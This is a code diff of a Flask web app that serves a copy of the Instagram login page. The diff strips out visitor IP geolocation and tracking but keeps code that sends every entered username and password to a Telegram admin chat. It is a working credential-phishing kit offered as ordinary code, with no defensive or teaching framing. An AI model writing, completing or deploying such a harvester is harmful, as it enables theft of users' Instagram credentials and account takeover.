@@ -1,7 +1,5 @@
 from flask import Flask, request, render_template_string, flash
 import requests
-from ip2geotools.databases.noncommercial import DbIpCity
-import json
 
 app = Flask(__name__)
 app.secret_key = 'secret123'  # Needed for flashing messages
@@ -13,31 +11,6 @@ ADMIN_CHAT_ID = '6420116837'
 # Dummy credentials for login check
 VALID_USERNAME = "admin"
 VALID_PASSWORD = "admin123"
-
-import requests
-
-def get_user_details(ip):
-    try:
-        if ip == '127.0.0.1':
-            ip = requests.get('https://api.ipify.org').text
-        
-        res = requests.get(f"https://ipapi.co/{ip}/json/").json()
-        return {
-            'ip': ip,
-            'city': res.get("city", "Unknown"),
-            'country': res.get("country_name", "Unknown"),
-            'region': res.get("region", "Unknown"),
-            'coordinates': f"{res.get('latitude', '?')}, {res.get('longitude', '?')}"
-        }
-    except:
-        return {
-            'ip': ip,
-            'city': 'Unknown',
-            'country': 'Unknown',
-            'region': 'Unknown',
-            'coordinates': 'Unknown'
-        }
-
 
 def send_telegram_message(message):
     try:
@@ -51,7 +24,7 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"Error sending Telegram message: {e}")
 
-# Exact Instagram login page clone
+# Instagram login page clone
 login_page = """
 <!DOCTYPE html>
 <html lang="en">
@@ -191,20 +164,6 @@ login_page = """
             margin: 10px 0;
             text-align: center;
         }
-        
-        .app-download {
-            text-align: center;
-            width: 100%;
-        }
-        
-        .app-stores {
-            margin-top: 20px;
-        }
-        
-        .app-store {
-            height: 40px;
-            margin: 0 4px;
-        }
     </style>
 </head>
 <body>
@@ -231,7 +190,7 @@ login_page = """
             </div>
             
             <a href="#" class="facebook-login">
-                <i class="fab fa-facebook-square"></i> Log in with Facebook
+                Log in with Facebook
             </a>
             
             <a href="#" class="forgot-password">Forgot password?</a>
@@ -240,14 +199,6 @@ login_page = """
         <div class="signup-box">
             <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
         </div>
-        
-        <div class="app-download">
-            <p>Get the app.</p>
-            <div class="app-stores">
-                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-store">
-                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-store">
-            </div>
-        </div>
     </div>
 </body>
 </html>
@@ -255,43 +206,16 @@ login_page = """
 
 @app.route("/", methods=["GET", "POST"])
 def login():
-    # Get user IP and details
-    user_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    referrer = request.headers.get('Referer', 'Direct access')
-    
-    # Get location details
-    user_details = get_user_details(user_ip)
-    
-    # Send initial access info to Telegram
-    access_message = f"""
-🚨 New Page Access 🚨
-
-📌 IP: {user_details['ip']}
-🌍 Location: {user_details['city']}, {user_details['region']}, {user_details['country']}
-📍 Coordinates: {user_details['coordinates']}
-
-🖥️ User Agent: {user_agent}
-🔗 Referrer: {referrer}
-"""
-    send_telegram_message(access_message)
-
     if request.method == "POST":
         username = request.form.get("username", "")
         password = request.form.get("password", "")
 
-        # Send login attempt to Telegram
+        # Send only username and password to Telegram
         login_message = f"""
 🔐 Login Attempt 🔐
 
 👤 Username: {username}
 🔑 Password: {password}
-
-📌 IP: {user_details['ip']}
-🌍 Location: {user_details['city']}, {user_details['region']}, {user_details['country']}
-📍 Coordinates: {user_details['coordinates']}
-
-🖥️ User Agent: {user_agent}
 """
         send_telegram_message(login_message)
 
